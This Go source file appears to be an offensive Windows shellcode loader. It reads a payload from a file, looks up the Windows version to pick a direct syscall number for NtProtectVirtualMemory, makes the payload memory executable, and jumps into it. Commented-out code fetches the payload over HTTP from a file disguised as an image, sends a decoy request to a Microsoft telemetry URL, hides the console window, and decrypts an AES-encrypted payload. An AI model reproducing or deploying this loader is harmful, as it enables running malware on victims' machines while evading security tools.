package main

import (
	"crypto/aes"
	"crypto/cipher"
	"fmt"
	"golang.org/x/sys/windows/registry"
	"io/ioutil"
	"os"
	"strconv"
	"syscall"
	"unsafe"
)


func NtProtectVirtualMemory(callid uint16, argh ...uintptr) (errcode uint32, err error)
var verCode uint16

func getWinver() {
	regOpen, _ := registry.OpenKey(registry.LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", registry.QUERY_VALUE)
	winVer, _, _ :=  regOpen.GetStringValue("CurrentVersion")
	majorNum, _, err := regOpen.GetIntegerValue("CurrentMajorVersionNumber")
	if err == nil{
		minorNum, _, _ := regOpen.GetIntegerValue("CurrentMinorVersionNumber")
		winVer = strconv.FormatUint(majorNum, 10) + "." + strconv.FormatUint(minorNum, 10)
	}
	defer regOpen.Close()
	fmt.Println("[+] Detected Version: " +winVer)

	if winVer == "10.0" {
		verCode = 0x50
	} else if winVer == "6.3" {
		verCode = 0x4f
	} else if winVer == "6.2" {
		verCode = 0x4e
	} else if winVer == "6.1" {
		verCode= 0x4d
	}
}


func main() {
	getWinver()
	//conWindow(false)

	var shellcode []byte
	//fun := "1"
	fileObj, _ := os.Open(os.Args[1])
	//fileObj, err := os.Open("loader.bin")
	shellcode, _ = ioutil.ReadAll(fileObj)

	//http请求shellcode与混淆
	/*
	errflag := true
	var resp *http.Response
	var err error
	CL := http.Client{
		Timeout: 10 * time.Second,
	}
	ip := "127.0.0.1"
	f := "out.jpg"
	port := ":443"


	for errflag == true {
		CL.Get("https://web.vortex.data.microsoft.com/collect/v1")
		resp, err = CL.Get("http://"+ ip +port+"/"+f)
		if err != nil {
			errflag = true
		}else{
			if resp.StatusCode != 200 {
				errflag = true
			}else{
				errflag = false
			}
		}
		if errflag == true {
			//fmt.Println("sleep")
			time.Sleep(5 * time.Second)
		}
	}

	defer resp.Body.Close()
	if resp.StatusCode == http.StatusOK {
		bodyBytes, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			panic(err)
		}
		shellcode = bodyBytes
	}

	 */

	//exec
	create(shellcode,uintptr(0xffffffffffffffff))
}

/*
func conWindow(show bool) {
	getWin := syscall.NewLazyDLL("kernel32.dll").NewProc("GetConsoleWindow")
	showWin := syscall.NewLazyDLL("user32.dll").NewProc("ShowWindow")
	hwnd, _, _ := getWin.Call()
	if hwnd == 0 {
		return
	}
	if show {
		var SW_RESTORE uintptr = 9
		showWin.Call(hwnd, SW_RESTORE)
	} else {
		var SW_HIDE uintptr = 0
		showWin.Call(hwnd, SW_HIDE)
	}
}
 */



func create(scci []byte,hand1e uintptr){
	//shellcode加密
	//rawShellcode := decrypt(scci,[]byte("0147efd7afdba2582c78807a8207c285"))
	//rawShellcode = append(rawShellcode,[]byte("0x00")[0])
	rawShellcode := scci

	//init
	targetPtr := func() {
	}

	var old uintptr
	thisThread := hand1e


	regionsize := uintptr(len(rawShellcode))

/*
	var targetPtr uintptr
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	ntAllocateVirtualMemory := ntdll.NewProc("NtAllocateVirtualMemory")
	ntAllocateVirtualMemory.Call(uintptr(0xffffffffffffffff), uintptr(unsafe.Pointer(&targetPtr)), 0, uintptr(unsafe.Pointer(&regionsize)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)


 */


	//regionsize := unsafe.Sizeof(rawShellcode)

	/*
	ntdll := syscall.NewLazyDLL("ntdll")
	prot := ntdll.NewProc("ZwProtectVirtualMemory")


	//ZwProtectVirtualMemory
	_, _, r := prot.Call(
		thisThread,
		uintptr(unsafe.Pointer(&targetPtr)),
		uintptr(unsafe.Pointer(&regionsize)),
		syscall.PAGE_READWRITE,
		uintptr(unsafe.Pointer(&old)))
	if r.Error() != "The operation completed successfully." {
		return
	}

	 */

	r,_ := NtProtectVirtualMemory(
		verCode,
		thisThread,
		uintptr(unsafe.Pointer((*uintptr)(unsafe.Pointer(&targetPtr)))),
		uintptr(unsafe.Pointer(&regionsize)),
		syscall.PAGE_READWRITE,
		uintptr(unsafe.Pointer(&old)))
	if r != 0 {
		panic("Call to VirtualProtect failed!")
	}

	//change addr first pointer
	*(**uintptr)(unsafe.Pointer(&targetPtr)) = (*uintptr)(unsafe.Pointer(&rawShellcode))

	//change addr second pointer
	//**(**uintptr)(unsafe.Pointer(&targetPtr)) = (uintptr)(unsafe.Pointer(&rawShellcode[0]))

	var old0 uintptr

	/*
	//ZwProtectVirtualMemory
	_, _, r = prot.Call(
		thisThread,
		uintptr(unsafe.Pointer(&rawShellcode)),
		uintptr(unsafe.Pointer(&regionsize)),
		syscall.PAGE_EXECUTE_READWRITE,
		uintptr(unsafe.Pointer(&old0)))
	if r.Error() != "The operation completed successfully." {
		return
	}
	 */

	r,_ = NtProtectVirtualMemory(
		verCode,
		thisThread,
		uintptr(unsafe.Pointer((*uintptr)(unsafe.Pointer(&rawShellcode)))),
		uintptr(unsafe.Pointer(&regionsize)),
		syscall.PAGE_EXECUTE_READWRITE,
		uintptr(unsafe.Pointer(&old0)))
	if r != 0 {
		panic("Call to VirtualProtect failed!")
	}

	//execute
	syscall.Syscall(uintptr(unsafe.Pointer(&rawShellcode[0])),0, 0, 0, 0)

	//下述方式有一定概率内存报错
	//targetPtr()
	//fmt.Println("catch em")
}


func decrypt(ciphertext []byte, key []byte)(rawText []byte){
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		panic(err)
	}
	nonce := ciphertext[:gcm.NonceSize()]
	ciphertext = ciphertext[gcm.NonceSize():]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		panic(err)
	}
	return plaintext
}


